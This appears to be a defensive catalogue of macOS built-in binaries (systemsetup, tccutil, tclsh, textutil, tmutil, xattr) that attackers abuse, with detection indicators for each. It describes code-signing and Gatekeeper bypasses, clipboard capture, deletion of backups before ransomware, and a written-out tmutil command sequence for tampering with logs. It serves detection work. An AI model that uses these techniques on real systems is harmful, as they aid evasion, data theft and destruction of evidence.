Print the information of developer tools
Prints the currently active version of the Xcode developer tools and SDK.
Print power and battery information
Prints power and battery information, including the current AC wattage and battery cycle count.
indicators: Jamf Protect: Detect system_profiler activity that gathers system information

description:
systemsetup configures certain per-machine settings typically configured in the System Preferences application.
The systemsetup command requires at least "admin" privileges to run.
native_purpose: Enable remote login, remote apple events for the machine
known_behaviors: Enable Remote Login
systemsetup can be used to enable SSH for remote login
Enable Remote Apple Events

systemsetup can be used to enable Remote Apple Events. 
Set whether the system responds to events sent by other computers (such as AppleScripts).
indicators: Command line argument detection containing (args contain systemsetup AND (-setremoteappleevents OR -setremotelogin) AND on)
Jamf Protect: Detect systemsetup activity that enables remotelogin or appleremoteevents

description: tccutil is a command-line tool for managing the Transparency, Consent, and Control (TCC) permissions database. It allows users to revoke permissions for applications to access certain system resources, such as the camera, microphone, and location.
native_purpose: Command-line tool for managing the Transparency, Consent, and Control (TCC) permissions database
known_behaviors: Use the tccutil to reset specific permissions

Banshee Stealer resets the permissions that have already been allowed to applications on the system, which will cause the user to be prompted to give them again. This action may be intended to trick the user into unknowingly giving authorizations to the malware.
Use the tccutil to reset specific permissions for an application
Attackers use tccutil to reset permissions for services like Camera, Microphone, or AppleEvents.
indicators: No detections at time of publishing

description: tclsh is a shell-like utility that runs Tcl from standard input or a file. tclsh holds the "com.apple.security.cs.disable-library-validation" entitlement and is capable of loading arbitrary plug-ins, framework, and libraries without requiring signed code.
native_purpose: Run Tcl files or shell commands from standard input.
known_behaviors: Execute malicious dynamic library (.dylib) from standard input
An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.
indicators: Recommendations included in resource below. No formal detection content at this time.

description: The textutil binary is a command-line utility included in macOS that allows users to manipulate text files of various formats, using the mechanisms provided by the Cocoa text system. Formats include rtf, html, docx and others
native_purpose: Manipulate text files in various formats.
known_behaviors: Use the textutil to read several files and build a new file

A one-liner can load the content of multiple RTF files in a directory, concatenate their contents, and write the results out as a new file. This provides two sub-use-cases; one is building a malicious file from a collection of smaller files which could evade both network and host-based security controls as the traditional means of signature-based detection would be redundant; two is concatenating the content of several, potentially sensitive files before exfiltration. This command can also be looped to iterate a directory of files.
Capture clipboard content

By leveraging another command line tool, pbpaste, it is possible to write a one-liner which captures the content of the clipboard. If an attacker already has access to the system, the attacker could run this command to obtain sensitive information such as a password and then elevate their privileges or exfiltrate the information.
indicators: Command Line Argument Detection (args contain textutil AND (-convert OR -stdin OR pbpaste))

description: A tool for managing Time Machine, the native macOS backup utility.
native_purpose: Manage Time Machine backups.
known_behaviors: Disable Time Machine
The following command disables Time Machine. An attacker can use this to prevent backups from occurring.
Delete a backup
The following command deletes the specified backup. An adversary may perform this action before launching a ransomware attack to prevent the victim from restoring their files.
Restore a backup
The following command restore the specified backup. An attacker can use this to restore a backup of a sensitive file that was deleted.
Tamper with system logs
An adversary can use the snapshot and restore commands together to tamper with system logs. This is fixed in macOS 10.15.4+.
Exclude path from backup
An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.
command_examples:
mkdir /tmp/snapshot
tmutil localsnapshot
tmutil listlocalsnapshots /
mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot
open /tmp/snapshot
sudo vim /var/log/system.log
tmutil restore com.apple.TimeMachine.2023-05-01-090000.local
indicators: Jamf Protect: Detect the deletion of localsnapshots
Sigma: Time Machine Backup Deletion Attempt Via Tmutil - MacOS
Sigma: Time Machine Backup Disabled Via Tmutil - MacOS
Sigma: New File Exclusion Added To Time Machine Via Tmutil - MacOS

description: The xattr command can be used to display, modify or remove the extended attributes of one or more files, including directories and symbolic links.  Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).  The metadata is often a null-terminated UTF-8 string, but can also be arbitrary binary data.  xattr can be used to bypass Gatekeeper.
native_purpose: Display and manipulate extended attributes.
known_behaviors: Bypass Gatekeeper via xattr
Use xattr to remove quarantine extended attribute from a file.
Bypass Gatekeeper via xattr
Use xattr to remove quarantine extended attribute from multiple files or directories.
indicators: Jamf Protect: Detect activity related to xattr and extended attributes
